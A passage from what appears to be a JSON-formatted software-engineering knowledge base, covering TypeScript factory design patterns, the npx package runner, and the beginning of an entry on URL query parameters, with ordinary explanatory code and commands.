WordDocument implements Document {\n  open(): void {\n    console.log('Opening Word document');\n  }\n  \n  save(): void {\n    console.log('Saving as DOCX');\n  }\n  \n  close(): void {\n    console.log('Closing Word document');\n  }\n}\n\nclass SpreadsheetDocument implements Document {\n  open(): void {\n    console.log('Opening spreadsheet');\n  }\n  \n  save(): void {\n    console.log('Saving as XLSX');\n  }\n  \n  close(): void {\n    console.log('Closing spreadsheet');\n  }\n}\n\n// Creator abstract class\nabstract class Application {\n  // Factory method\n  abstract createDocument(): Document;\n  \n  // Uses factory method\n  newDocument(): void {\n    const doc = this.createDocument();\n    doc.open();\n    console.log('Document ready for editing');\n  }\n  \n  openExisting(filename: string): void {\n    const doc = this.createDocument();\n    console.log(`Loading ${filename}`);\n    doc.open();\n  }\n}\n\n// Concrete creators\nclass PDFApplication extends Application {\n  createDocument(): Document {\n    return new PDFDocument();\n  }\n}\n\nclass WordApplication extends Application {\n  createDocument(): Document {\n    return new WordDocument();\n  }\n}\n\nclass SpreadsheetApplication extends Application {\n  createDocument(): Document {\n    return new SpreadsheetDocument();\n  }\n}\n\n// Usage\nfunction launchApp(app: Application) {\n  app.newDocument();\n}\n\nlaunchApp(new PDFApplication());\n// Opening PDF document\n// Document ready for editing\n\nlaunchApp(new WordApplication());\n// Opening Word document\n// Document ready for editing\n```\n\n## Abstract Factory Pattern\n\nCreates families of related objects without specifying their concrete classes.\n\n### Example: UI Theme Factory\n\n```typescript\n// Product interfaces (related products)\ninterface Button {\n  render(): void;\n  onClick(): void;\n}\n\ninterface Checkbox {\n  render(): void;\n  toggle(): void;\n}\n\ninterface Input {\n  render(): void;\n  getValue(): string;\n}\n\n// Concrete products - Dark theme\nclass DarkButton implements Button {\n  render(): void {\n    console.log('Rendering dark button');\n  }\n  \n  onClick(): void {\n    console.log('Dark button clicked');\n  }\n}\n\nclass DarkCheckbox implements Checkbox {\n  render(): void {\n    console.log('Rendering dark checkbox');\n  }\n  \n  toggle(): void {\n    console.log('Dark checkbox toggled');\n  }\n}\n\nclass DarkInput implements Input {\n  render(): void {\n    console.log('Rendering dark input');\n  }\n  \n  getValue(): string {\n    return 'dark-input-value';\n  }\n}\n\n// Concrete products - Light theme\nclass LightButton implements Button {\n  render(): void {\n    console.log('Rendering light button');\n  }\n  \n  onClick(): void {\n    console.log('Light button clicked');\n  }\n}\n\nclass LightCheckbox implements Checkbox {\n  render(): void {\n    console.log('Rendering light checkbox');\n  }\n  \n  toggle(): void {\n    console.log('Light checkbox toggled');\n  }\n}\n\nclass LightInput implements Input {\n  render(): void {\n    console.log('Rendering light input');\n  }\n  \n  getValue(): string {\n    return 'light-input-value';\n  }\n}\n\n// Abstract Factory interface\ninterface UIFactory {\n  createButton(): Button;\n  createCheckbox(): Checkbox;\n  createInput(): Input;\n}\n\n// Concrete factories\nclass DarkThemeFactory implements UIFactory {\n  createButton(): Button {\n    return new DarkButton();\n  }\n  \n  createCheckbox(): Checkbox {\n    return new DarkCheckbox();\n  }\n  \n  createInput(): Input {\n    return new DarkInput();\n  }\n}\n\nclass LightThemeFactory implements UIFactory {\n  createButton(): Button {\n    return new LightButton();\n  }\n  \n  createCheckbox(): Checkbox {\n    return new LightCheckbox();\n  }\n  \n  createInput(): Input {\n    return new LightInput();\n  }\n}\n\n// Client code\nclass Application {\n  private button: Button;\n  private checkbox: Checkbox;\n  private input: Input;\n  \n  constructor(factory: UIFactory) {\n    this.button = factory.createButton();\n    this.checkbox = factory.createCheckbox();\n    this.input = factory.createInput();\n  }\n  \n  render(): void {\n    this.button.render();\n    this.checkbox.render();\n    this.input.render();\n  }\n}\n\n// Usage\nconst userPrefersDark = true;\n\nconst factory = userPrefersDark\n  ? new DarkThemeFactory()\n  : new LightThemeFactory();\n\nconst app = new Application(factory);\napp.render();\n// Rendering dark button\n// Rendering dark checkbox\n// Rendering dark input\n\n// Switching themes just requires changing the factory\n// All UI components automatically match the theme\n```\n\n## Similarities Across Factory Patterns\n\n### 1. Core Principle\n\nAll factory patterns share the same fundamental goal:\n\n```typescript\n// All variants encapsulate object creation\n// Instead of: new ConcreteClass()\n// Use: Factory.create()\n\nSimple Factory:     ShapeFactory.create('circle')\nFactory Method:     creator.factoryMethod()\nAbstract Factory:   factory.createButton()\n\nCommon benefit: Client code doesn't know concrete classes\n```\n\n### 2. Dependency Inversion\n\n```typescript\n// All patterns follow Dependency Inversion Principle\n// Depend on abstractions, not concrete classes\n\n// Client depends on interface, not implementation\nfunction processShape(shape: Shape) {  // Interface\n  shape.draw();\n  // Doesn't care if Circle, Rectangle, or Triangle\n}\n\n// Factory provides the concrete instance\nconst shape = ShapeFactory.create('circle', 5);\nprocessShape(shape);\n```\n\n### 3. Open/Closed Principle\n\n```typescript\n// All patterns allow adding new types without modifying existing code\n\n// Adding new shape:\n// 1. Create class implementing Shape\nclass Hexagon implements Shape {\n  draw() { console.log('Drawing hexagon'); }\n  area() { return 100; }\n}\n\n// 2. Update factory\n// Client code unchanged ✅\n\n// Open for extension (new types)\n// Closed for modification (existing code)\n```\n\n### 4. Testing Benefits\n\n```typescript\n// All patterns improve testability\n\n// Mock the factory in tests\nclass MockShapeFactory {\n  static create(): Shape {\n    return {\n      draw: jest.fn(),\n      area: () => 100\n    };\n  }\n}\n\n// Test without real implementations\ntest('processShape calls draw', () => {\n  const shape = MockShapeFactory.create();\n  processShape(shape);\n  expect(shape.draw).toHaveBeenCalled();\n});\n```\n\n## Differences Between Factory Patterns\n\n### 1. Complexity Level\n\n```\nSimple Factory:\n└─ Single class/function\n└─ Easiest to understand\n└─ Good for basic scenarios\n\nFactory Method:\n└─ Abstract class + subclasses\n└─ Moderate complexity\n└─ Uses inheritance\n\nAbstract Factory:\n└─ Multiple related products\n└─ Most complex\n└─ Creates product families\n\nComplexity: Simple Factory < Factory Method < Abstract Factory\n```\n\n### 2. Structure\n\n```typescript\n// Simple Factory: Static method or standalone function\nclass Factory {\n  static create(type: string): Product {\n    if (type === 'A') return new ProductA();\n    if (type === 'B') return new ProductB();\n  }\n}\n\n// Factory Method: Abstract class with override\nabstract class Creator {\n  abstract factoryMethod(): Product;\n}\n\nclass ConcreteCreator extends Creator {\n  factoryMethod(): Product {\n    return new ConcreteProduct();\n  }\n}\n\n// Abstract Factory: Multiple creation methods\ninterface AbstractFactory {\n  createProductA(): ProductA;\n  createProductB(): ProductB;\n  createProductC(): ProductC;\n}\n```\n\n### 3. When to Use Each\n\n```typescript\n// Simple Factory: Basic object creation\n// Use when: Simple conditional logic, few types\nclass LoggerFactory {\n  static create(level: string): Logger {\n    switch (level) {\n      case 'console': return new ConsoleLogger();\n      case 'file': return new FileLogger();\n      default: return new ConsoleLogger();\n    }\n  }\n}\n\n// Factory Method: Subclasses determine type\n// Use when: Framework with extension points\nabstract class Game {\n  abstract createPlayer(): Player;\n  \n  startGame() {\n    const player = this.createPlayer();\n    player.spawn();\n  }\n}\n\nclass ChessGame extends Game {\n  createPlayer(): Player {\n    return new ChessPlayer();\n  }\n}\n\n// Abstract Factory: Families of related objects\n// Use when: Multiple related products that must work together\ninterface DatabaseFactory {\n  createConnection(): Connection;\n  createQuery(): Query;\n  createTransaction(): Transaction;\n}\n\nclass PostgresFactory implements DatabaseFactory {\n  createConnection() { return new PostgresConnection(); }\n  createQuery() { return new PostgresQuery(); }\n  createTransaction() { return new PostgresTransaction(); }\n}\n// All products work together (same database)\n```\n\n### 4. Flexibility\n\n```typescript\n// Simple Factory: Least flexible\n// Adding new type requires modifying factory switch/if statement\nclass Factory {\n  static create(type: string) {\n    switch (type) {\n      case 'A': return new A();\n      case 'B': return new B();\n      // Must modify this code for new types ⚠️\n    }\n  }\n}\n\n// Factory Method: More flexible\n// Adding new type requires new subclass (no modification)\nclass NewCreator extends Creator {\n  factoryMethod() {\n    return new NewProduct();  // New product without changing existing code ✅\n  }\n}\n\n// Abstract Factory: Most flexible for product families\n// Adding new family requires new factory\nclass NewThemeFactory implements UIFactory {\n  createButton() { return new NewButton(); }\n  createCheckbox() { return new NewCheckbox(); }\n  // Entire new theme without changing existing themes ✅\n}\n```\n\n### 5. Use Cases\n\n```\nSimple Factory:\n✅ Logger creation (console, file, remote)\n✅ Shape generation (circle, square, triangle)\n✅ Payment processing (credit card, PayPal, crypto)\n❌ Complex inheritance hierarchies\n❌ Related product families\n\nFactory Method:\n✅ Frameworks with plugin systems\n✅ Document editors (PDF, Word, Excel)\n✅ Game character creation\n✅ Template Method pattern integration\n❌ Unrelated products\n❌ Very simple scenarios\n\nAbstract Factory:\n✅ UI themes (dark mode, light mode)\n✅ Cross-platform UIs (Windows, Mac, Linux)\n✅ Database drivers (Postgres, MySQL, SQLite)\n✅ Related product families that must match\n❌ Single product creation\n❌ Unrelated products\n```\n\n## Common Pitfalls\n\n- Overusing factories for trivial object creation (not everything needs a factory)\n- Simple Factory with too many conditionals (consider Factory Method instead)\n- Not using dependency injection (factories become global state)\n- Creating \"God factories\" that do too much (split into focused factories)\n- Forgetting to handle unknown types (always throw or return default)\n- Not considering configuration-based factories (can be more maintainable)\n\n## Practical Applications\n\n- **Dependency Injection Containers:** Spring, Angular create objects via factories\n- **ORMs:** Sequelize, TypeORM create model instances\n- **Testing Frameworks:** Jest, Mocha create test doubles\n- **UI Libraries:** React.createElement, Vue component factories\n- **Game Development:** Character, enemy, item creation\n- **Plugin Systems:** WordPress, VS Code extension loading\n\n## References\n\n- [Gang of Four Design Patterns](https://en.wikipedia.org/wiki/Design_Patterns) - Original pattern catalog\n- [Refactoring.Guru: Factory Pattern](https://refactoring.guru/design-patterns/factory-method)\n- [Head First Design Patterns](https://www.oreilly.com/library/view/head-first-design/0596007124/)\n- [TypeScript Design Patterns](https://www.patterns.dev/posts/factory-pattern/)\n\n---\n\n## Greater Detail\n\n### Configuration-Based Factory\n\n```typescript\n// Instead of hardcoding types, use configuration\ninterface ShapeConfig {\n  type: string;\n  params: number[];\n}\n\nclass ConfigurableShapeFactory {\n  private creators = new Map<string, (params: number[]) => Shape>();\n  \n  register(type: string, creator: (params: number[]) => Shape): void {\n    this.creators.set(type, creator);\n  }\n  \n  create(config: ShapeConfig): Shape {\n    const creator = this.creators.get(config.type);\n    if (!creator) {\n      throw new Error(`Unknown shape type: ${config.type}`);\n    }\n    return creator(config.params);\n  }\n}\n\n// Setup\nconst factory = new ConfigurableShapeFactory();\nfactory.register('circle', ([radius]) => new Circle(radius));\nfactory.register('rectangle', ([w, h]) => new Rectangle(w, h));\nfactory.register('triangle', ([b, h]) => new Triangle(b, h));\n\n// Usage with configuration\nconst configs: ShapeConfig[] = [\n  { type: 'circle', params: [5] },\n  { type: 'rectangle', params: [4, 6] },\n  { type: 'triangle', params: [3, 4] }\n];\n\nconst shapes = configs.map(config => factory.create(config));\n\n// Benefits:\n// - Configuration can come from database, JSON, API\n// - Easy to add new shapes without modifying factory\n// - Registration can happen at runtime\n```\n\n### Factory with Dependency Injection\n\n```typescript\n// Inject dependencies into factory\ninterface Logger {\n  log(message: string): void;\n}\n\nclass PaymentFactory {\n  constructor(\n    private logger: Logger,\n    private apiKey: string\n  ) {}\n  \n  create(type: string): Payment {\n    this.logger.log(`Creating payment of type: ${type}`);\n    \n    switch (type) {\n      case 'stripe':\n        return new StripePayment(this.apiKey, this.logger);\n      case 'paypal':\n        return new PayPalPayment(this.apiKey, this.logger);\n      default:\n        throw new Error(`Unknown payment type: ${type}`);\n    }\n  }\n}\n\n// Usage\nconst logger = new ConsoleLogger();\nconst apiKey = process.env.PAYMENT_API_KEY;\nconst factory = new PaymentFactory(logger, apiKey);\n\nconst payment = factory.create('stripe');\n// All created objects have necessary dependencies\n```\n\n### Factory with Validation\n\n```typescript\nclass ValidatedUserFactory {\n  private validators = {\n    email: (email: string) => /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email),\n    age: (age: number) => age >= 0 && age <= 150,\n    username: (username: string) => username.length >= 3\n  };\n  \n  create(userData: UserData): User {\n    // Validate before creation\n    if (!this.validators.email(userData.email)) {\n      throw new Error('Invalid email');\n    }\n    \n    if (!this.validators.age(userData.age)) {\n      throw new Error('Invalid age');\n    }\n    \n    if (!this.validators.username(userData.username)) {\n      throw new Error('Username too short');\n    }\n    \n    // All validations passed, create user\n    return new User(userData);\n  }\n}\n\n// Usage\nconst factory = new ValidatedUserFactory();\n\ntry {\n  const user = factory.create({\n    email: 'invalid-email',\n    age: 25,\n    username: 'john'\n  });\n} catch (error) {\n  console.error(error.message); // Invalid email\n}\n```\n\n### Async Factory\n\n```typescript\n// Factory that performs async operations\nclass AsyncUserFactory {\n  async create(email: string): Promise<User> {\n    // Check if user already exists\n    const existing = await database.findByEmail(email);\n    if (existing) {\n      throw new Error('User already exists');\n    }\n    \n    // Fetch additional data from API\n    const profileData = await api.fetchProfile(email);\n    \n    // Create and save user\n    const user = new User({\n      email,\n      profile: profileData\n    });\n    \n    await database.save(user);\n    return user;\n  }\n}\n\n// Usage\nconst factory = new AsyncUserFactory();\nconst user = await factory.create('user@example.com');\n```\n\n### Factory with Caching/Pooling\n\n```typescript\n// Reuse expensive objects\nclass ConnectionFactory {\n  private pool: Connection[] = [];\n  private maxPoolSize = 10;\n  \n  create(): Connection {\n    // Return existing connection from pool\n    if (this.pool.length > 0) {\n      const connection = this.pool.pop()!;\n      console.log('Reusing connection from pool');\n      return connection;\n    }\n    \n    // Create new connection\n    console.log('Creating new connection');\n    return new Connection();\n  }\n  \n  release(connection: Connection): void {\n    // Return connection to pool\n    if (this.pool.length < this.maxPoolSize) {\n      this.pool.push(connection);\n      console.log('Connection returned to pool');\n    } else {\n      connection.close();\n      console.log('Pool full, closing connection');\n    }\n  }\n}\n\n// Usage\nconst factory = new ConnectionFactory();\n\nconst conn1 = factory.create();  // Creating new connection\nfactory.release(conn1);           // Connection returned to pool\n\nconst conn2 = factory.create();  // Reusing connection from pool\n```\n\n### Real-World React Example\n\n```typescript\n// Factory pattern in React component library\ninterface ButtonProps {\n  label: string;\n  onClick: () => void;\n  variant: 'primary' | 'secondary' | 'danger';\n}\n\nclass ButtonFactory {\n  static create(props: ButtonProps): JSX.Element {\n    switch (props.variant) {\n      case 'primary':\n        return (\n          <button\n            className=\"btn-primary\"\n            onClick={props.onClick}\n          >\n            {props.label}\n          </button>\n        );\n      \n      case 'secondary':\n        return (\n          <button\n            className=\"btn-secondary\"\n            onClick={props.onClick}\n          >\n            {props.label}\n          </button>\n        );\n      \n      case 'danger':\n        return (\n          <button\n            className=\"btn-danger\"\n            onClick={props.onClick}\n          >\n            {props.label}\n          </button>\n        );\n    }\n  }\n}\n\n// Usage in component\nfunction App() {\n  return (\n    <div>\n      {ButtonFactory.create({\n        label: 'Save',\n        variant: 'primary',\n        onClick: () => console.log('Saved')\n      })}\n      \n      {ButtonFactory.create({\n        label: 'Delete',\n        variant: 'danger',\n        onClick: () => console.log('Deleted')\n      })}\n    </div>\n  );\n}\n```\n\n### Best Practices Summary\n\n```typescript\n// ✅ Good practices:\n\n// 1. Return interfaces, not concrete classes\ninterface Payment { }\nclass PaymentFactory {\n  create(): Payment {  // Return interface\n    return new ConcretePayment();\n  }\n}\n\n// 2. Use descriptive factory method names\ncreateFromConfig(config: Config)\ncreateForEnvironment(env: string)\ncreateWithDefaults()\n\n// 3. Handle invalid types gracefully\ncreate(type: string): Product {\n  if (!this.supports(type)) {\n    throw new Error(`Unsupported type: ${type}`);\n  }\n  return this.instantiate(type);\n}\n\n// 4. Consider lazy initialization\nprivate instance?: Product;\n\nget(): Product {\n  if (!this.instance) {\n    this.instance = this.create();\n  }\n  return this.instance;\n}\n\n// 5. Document factory purpose and usage\n/**\n * Creates notification senders based on channel type.\n * \n * @param type - Notification channel (email, sms, push)\n * @returns Notification sender instance\n * @throws Error if type is unsupported\n */\nstatic create(type: string): Notification { }\n\n// 6. Use TypeScript unions for type safety\ntype NotificationType = 'email' | 'sms' | 'push';\n\ncreate(type: NotificationType): Notification {\n  // TypeScript ensures only valid types\n}\n```\n\n### When NOT to Use Factory Pattern\n\n```typescript\n// ❌ Don't use factory for simple object creation\n// Simple case: Direct instantiation is clearer\nconst user = new User('Alice', 25);\n\n// ❌ No need for factory\nconst user = UserFactory.create('Alice', 25);\n\n// ❌ Don't use when only one concrete class exists\n// Just use the constructor directly\nconst logger = new Logger();\n\n// ❌ No benefit\nconst logger = LoggerFactory.create();\n\n// ✅ DO use factory when:\n// - Multiple implementations exist\n// - Creation logic is complex\n// - Need runtime type determination\n// - Want to centralize creation logic\n// - Adding new types frequently\n```"
    },
    {
      "id": "swe/devops/shell/npx",
      "title": "npx: Complete Overview",
      "path": [
        "swe",
        "devops",
        "shell",
        "npx"
      ],
      "content": "# npx: Complete Overview\n\n`npx` is a command-line tool that comes bundled with npm (v5.2+) for **executing Node.js packages without permanently installing them**. Think of it as a vending machine for CLI tools — you use what you need, when you need it, without cluttering your toolbox. It also serves as a convenient shortcut for running locally installed project binaries without typing out full `node_modules` paths.\n\n## Key Points\n\n- **Bundled with npm:** Available automatically if you have npm 5.2+ or Node.js 8.2+.\n- **No Global Install Required:** Run packages on-the-fly without `npm install -g`.\n- **Local Binary Shortcut:** Executes project-local binaries from `node_modules/.bin/` without the full path.\n- **Always Latest:** When running a remote package, npx fetches the latest version by default.\n- **One-Off Execution:** Downloaded packages are cached temporarily, not added to your project.\n\n## What Is a Binary?\n\nIn the context of Node.js and npm, a **binary** (or \"bin\") is an **executable script** that a package provides — a command you can run directly from your terminal. It's called a \"binary\" by convention borrowed from compiled languages where executables are literal binary files, but in Node.js they're typically just JavaScript files with a special header.\n\nWhen a package defines a binary, it declares it in its `package.json`:\n\n```json\n// eslint's package.json (simplified)\n{\n  \"name\": \"eslint\",\n  \"bin\": {\n    \"eslint\": \"./bin/eslint.js\"\n  }\n}\n```\n\nThis tells npm: \"when someone installs this package, make the command `eslint` available, and point it to `./bin/eslint.js`.\"\n\n**Where binaries live depends on how you install:**\n\n```\nGlobal install (npm install -g eslint):\n  → binary goes to a system-wide location (e.g., /usr/local/bin/eslint)\n  → available everywhere in your terminal\n\nLocal install (npm install eslint):\n  → binary goes to node_modules/.bin/eslint\n  → only available within that project\n\nnpx eslint:\n  → finds the binary wherever it is (local → global → download)\n  → runs it without you worrying about paths\n```\n\n**Analogy:** Think of a binary as an app's icon on your desktop. The \"package\" is the full application folder with all its files, but the \"binary\" is the specific entry point you click to launch it. When npm installs a package with a `bin` field, it's essentially creating a shortcut that says \"run this script when someone types this command.\"\n\n## How npx Works\n\nWhen you run `npx <package>`, it follows this resolution order:\n\n```\n1. Check local node_modules/.bin/ → found? Execute it.\n        ↓ (not found)\n2. Check global installs → found? Execute it.\n        ↓ (not found)\n3. Download temporarily from npm registry → execute → discard.\n```\n\n**Analogy:** If `npm install -g` is buying a tool and keeping it in your garage, `npx` is borrowing one from the hardware store, using it, and returning it.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Running a Package Without Installing\n\nThe most common use case — one-off CLI tools you don't want installed globally.\n\n```bash\n# Scaffold a new React app (without globally installing create-react-app)\nnpx create-react-app my-app\n\n# Scaffold a Next.js project\nnpx create-next-app@latest my-app\n\n# Scaffold a Vite project\nnpx create-vite@latest my-app\n\n# Start a quick local HTTP server\nnpx serve ./build\n\n# Check for outdated or unused dependencies\nnpx depcheck\n\n# Pretty-print a JSON file\nnpx json5 < config.json\n```\n\nWithout `npx`, you'd need:\n```bash\nnpm install -g create-react-app   # pollutes global namespace\ncreate-react-app my-app           # might be outdated next time you use it\n```\n\n### 2. Running Local Project Binaries\n\nWhen you install a package locally, its binary goes into `node_modules/.bin/`. Without `npx`, running it is verbose.\n\n```bash\n# Without npx — the long way\n./node_modules/.bin/eslint src/\n./node_modules/.bin/jest --watch\n./node_modules/.bin/tsc --noEmit\n\n# With npx — just works\nnpx eslint src/\nnpx jest --watch\nnpx tsc --noEmit\n```\n\n`npx` checks `node_modules/.bin/` first, so it finds your locally installed version automatically. This is also what happens behind the scenes when you use npm scripts:\n\n```json\n// package.json — these work because npm scripts also resolve from node_modules/.bin/\n{\n  \"scripts\": {\n    \"lint\": \"eslint src/\",\n    \"test\": \"jest --watch\",\n    \"typecheck\": \"tsc --noEmit\"\n  }\n}\n```\n\n### 3. What's Actually Inside `node_modules/.bin/`?\n\nLooking inside demystifies what npx is doing:\n\n```bash\nls -la node_modules/.bin/\n# eslint -> ../eslint/bin/eslint.js\n# jest -> ../jest-cli/bin/jest.js\n# tsc -> ../typescript/bin/tsc\n# prettier -> ../prettier/bin/prettier.cjs\n```\n\nThese are **symlinks** (shortcuts) pointing to the actual JavaScript files inside each package's folder. When you run `npx eslint`, it's equivalent to running `node ./node_modules/eslint/bin/eslint.js` — npx just resolves the path for you.\n\nThe executable scripts themselves typically start with a **shebang line** that tells the OS to run them with Node.js:\n\n```js\n#!/usr/bin/env node\n// This is what the top of node_modules/.bin/eslint.js looks like\n'use strict';\n\nrequire('../lib/cli').execute(process.argv);\n```\n\nThe `#!/usr/bin/env node` line is what makes a plain `.js` file behave like a standalone command-line program.\n\n### 4. Running a Specific Version\n\n```bash\n# Run a specific version of a package\nnpx create-react-app@4.0.3 my-app\n\n# Run the latest version (explicit)\nnpx create-next-app@latest my-app\n\n# Test your library against a different TypeScript version\nnpx typescript@5.3 --noEmit\nnpx typescript@5.5 --noEmit\n```\n\nThis is useful for testing compatibility or reproducing bugs against specific versions without polluting your environment.\n\n### 5. Running a Package from a GitHub Repo\n\n```bash\n# Run directly from a GitHub repository\nnpx github:user/repo\n\n# Example — run a tool from a teammate's branch\nnpx github:jdoe/custom-scaffolder#feature-branch\n```\n\n### 6. Running Multiple Commands\n\n```bash\n# Use -c flag to run a command string with access to npx-resolved binaries\nnpx -c \"eslint src/ && prettier --write src/\"\n```\n\n### 7. Common One-Off Tools\n\nThese are packages you'll likely never install globally but use through `npx` regularly:\n\n```bash\n# Project scaffolding\nnpx create-react-app my-app\nnpx create-next-app@latest my-app\nnpx create-vite@latest my-app\nnpx create-expo-app my-app\nnpx degit user/repo my-project        # clone a repo without git history\n\n# Code quality\nnpx eslint --init                      # initialize ESLint config\nnpx prettier --write \"src/**/*.ts\"     # format files\nnpx madge --circular src/              # detect circular dependencies\nnpx depcheck                           # find unused dependencies\n\n# Utilities\nnpx serve ./dist                       # static file server\nnpx http-server                        # another static server\nnpx kill-port 3000                     # kill process on a port\nnpx npm-check-updates -u              # update package.json versions\nnpx tldr <command>                     # community-driven man pages\nnpx license MIT                        # generate a license file\n\n# Database & API\nnpx prisma init                        # initialize Prisma ORM\nnpx prisma migrate dev                 # run migrations\nnpx drizzle-kit generate               # Drizzle ORM migrations\nnpx json-server --watch db.json        # fake REST API from a JSON file\n\n# AWS / Cloud\nnpx cdk init app --language typescript # AWS CDK project\nnpx sst dev                            # SST serverless dev mode\n```\n\n### 8. Interactive Prompts & `--yes` Flag\n\nWhen npx needs to download a package, it prompts for confirmation (as of npm 7+):\n\n```bash\n$ npx create-vite@latest\nNeed to install the following packages:\n  create-vite@6.0.1\nOk to proceed? (y)\n```\n\nSkip the prompt with `--yes` (useful in CI/CD):\n\n```bash\nnpx --yes create-vite@latest my-app\nnpx -y serve ./dist\n```\n\n### 9. npx vs npm exec\n\nAs of npm 7, `npx` is technically an alias for `npm exec`. They behave the same in most cases, with minor differences in argument parsing.\n\n```bash\n# These are equivalent\nnpx eslint src/\nnpm exec eslint -- src/\n\n# Note the -- separator with npm exec for passing args to the package\nnpm exec -- create-vite@latest my-app\nnpx create-vite@latest my-app          # npx doesn't need --\n```\n\nIn practice, most developers stick with `npx` because it's shorter and more intuitive.\n\n## npx vs npm install -g vs npm scripts\n\n| Approach | Use Case | Pros | Cons |\n|---|---|---|---|\n| `npx <pkg>` | One-off tools, scaffolders | Always latest, no cleanup | Slight download delay on first run |\n| `npm install -g` | Tools you use daily (e.g., `npm`, `vercel`) | Instant execution | Version can go stale, pollutes global scope |\n| `npm scripts` | Project-specific commands | Versioned with project, team-consistent | Requires `package.json` entry |\n\n**Rule of thumb:** If you use a tool *daily across all projects*, install it globally. If you use it *per-project*, put it in `devDependencies` and use npm scripts. If it's a *one-off or scaffolder*, use `npx`.\n\n## Common Pitfalls\n\n- **Typosquatting risk.** Since npx downloads and executes packages by name, a typo could run a malicious package. Double-check package names, especially for lesser-known tools. The confirmation prompt (npm 7+) helps here — read it.\n- **Assuming npx uses your local version.** If a package isn't installed locally, npx fetches the latest from npm. This can cause inconsistency if your project pins a specific version. For project tools, prefer `devDependencies` + npm scripts.\n- **Forgetting `@latest`.** For scaffolders like `create-react-app`, npx may use a cached older version. Use `@latest` explicitly: `npx create-react-app@latest`.\n- **CI/CD without `--yes`.** The interactive prompt hangs in non-interactive environments. Always use `npx --yes` or `npx -y` in pipelines.\n- **Confusing npx with npm.** `npx` *executes* packages. `npm` *manages* packages. `npx install` is not a thing — that's `npm install`.\n\n## Practical Applications\n\n- **Quick prototyping:** Spin up a new project with `npx create-vite@latest` without any prior setup.\n- **CI/CD pipelines:** Run one-off tools like `npx semantic-release` or `npx changeset publish` without adding them to project dependencies.\n- **Trying before committing:** Test a CLI tool before deciding to install it — `npx cowsay \"hello\"` costs you nothing.\n- **Running project scripts cleanly:** `npx jest --coverage` is cleaner than `./node_modules/.bin/jest --coverage` and doesn't require an npm script entry.\n- **Version testing:** Quickly test your code against multiple versions of a tool — `npx typescript@5.3 --noEmit` then `npx typescript@5.5 --noEmit`.\n\n## References\n\n- [npm Docs: npx](https://docs.npmjs.com/cli/v10/commands/npx)\n- [npm Docs: npm exec](https://docs.npmjs.com/cli/v10/commands/npm-exec)\n- [Node.js: Introduction to npx](https://nodejs.dev/en/learn/the-npx-nodejs-package-runner/)\n- [npm Blog: Introducing npx](https://blog.npmjs.org/post/162869356040/introducing-npx-an-npm-package-runner)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Cache Behavior:** npx caches downloaded packages in npm's global cache (`~/.npm/_npx/`). Use `npx --ignore-existing` to force a fresh download, bypassing both local installs and cache.\n- **Package Resolution with `--package`:** When a package name differs from its binary name, use `--package` to specify: `npx --package=@angular/cli ng new my-app`.\n- **Multiple Packages:** You can install multiple packages in a single npx context: `npx -p typescript -p ts-node ts-node script.ts`.\n- **Security:** npm 7+ added the download confirmation prompt specifically to combat typosquatting. For extra safety in CI, pin exact versions: `npx create-next-app@14.1.0` instead of `@latest`.\n- **Node Version Management:** `npx` pairs well with tools like `npx node@18 script.js` to test against specific Node versions without installing them (uses the `node` npm package)."
    },
    {
      "id": "swe/frontend/browser-stuff/query-params",
      "title": "URL Query Parameters: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "browser-stuff",
        "query-params"
      ],
      "content": "# URL Query Parameters: Complete Overview\n\nQuery parameters (query strings) are key-value pairs appended to a URL after a `?` symbol, used to send additional data to a server without modifying the URL path. They enable filtering, sorting, pagination, and customization of API responses or web pages. Think of them as optional settings you attach to a request—like adding filters to a camera lens to change what you capture.\n\n## Key Points\n\n- **Format:** `?key1=value1&key2=value2` appended to URL\n- **Purpose:** Pass data to server for filtering, searching, sorting, pagination\n- **Encoding:** Special characters must be URL-encoded (`%20` for space)\n- **Optional:** Usually optional parameters (unlike path params which are required)\n- **Access:** Retrieved server-side via request object, client-side via `URLSearchParams`\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Query Parameter**\n\n   ```js\n   // URL\n   https://api.example.com/products?category=electronics\n   \n   // Express.js (server)\n   app.get('/products', (req, res) => {\n     const category = req.query.category; // 'electronics'\n     // Filter products by category\n   });\n   \n   // Fetch API (client)\n   fetch('https://api.example.com/products?category=electronics');\n   ```\n\n2. **Multiple Query Parameters**\n\n   ```js\n   // URL\n   https://api.example.com/products?category=electronics&minPrice=100&maxPrice=500\n   \n   // JavaScript (parsing)\n   const url = new URL('https://api.example.com/products?category=electronics&minPrice=100');\n   const params = new URLSearchParams(url.search);\n   console.log(params.get('category')); // 'electronics'\n   console.log(params.get('minPrice')); // '100'\n   ```\n\n3. **Pagination with Query Params**\n\n   ```js\n   // URL pattern\n   https://api.example.com/users?page=2&limit=20\n   \n   // Express.js implementation\n   app.get('/users', (req, res) => {\n     const page = parseInt(req.query.page) || 1;\n     const limit = parseInt(req.query.limit) || 10;\n     const offset = (page - 1) * limit;\n     \n     // SELECT * FROM users LIMIT 20 OFFSET 20\n     const users = db.users.findMany({ skip: offset, take: limit });\n     res.json(users);\n   });\n   ```\n\n4. **Building Query Strings Programmatically**\n\n   ```js\n   // Using URLSearchParams\n   const params = new URLSearchParams({\n     search: 'laptop',\n     sort: 'price',\n     order: 'asc'\n   });\n   \n   fetch(`https://api.example.com/products?${params.toString()}`);\n   // https://api.example.com/products?search=laptop&sort=price&order=asc\n   \n   // React example\n   const [filters, setFilters] = useState({ category: 'books', minPrice: 10 });\n   \n   useEffect(() => {\n     const params = new URLSearchParams(filters);\n     fetch(`/api/products?${params}`);\n   }, [filters]);\n   ```\n\n5. **Array Values in Query Params**\n\n   ```js\n   // Multiple values for same key\n   https://api.example.com/products?tags=sale&tags=featured&tags=new\n   \n   // Express.js (returns array automatically)\n   app.get('/products', (req, res) => {\n     const tags = req.query.tags; // ['sale', 'featured', 'new']\n   });\n   \n   // Alternative formats\n   ?ids=1,2,3          // Comma-separated\n   ?ids[]=1&ids[]=2    // Array notation\n   ?filters={\"color\":\"red\",\"size\":\"M\"}  // JSON (needs encoding)\n   ```\n\n6. **URL Encoding Special Characters**\n\n   ```js\n   // Manual encoding\n   const search = 'coffee & tea';\n   const encoded = encodeURIComponent(search);\n   // 'coffee%20%26%20tea'\n   \n   fetch(`/api/search?q=${encoded}`);\n   \n   // URLSearchParams handles encoding automatically\n   const params = new URLSearchParams({ q: 'coffee & tea' });\n   // Automatically becomes: 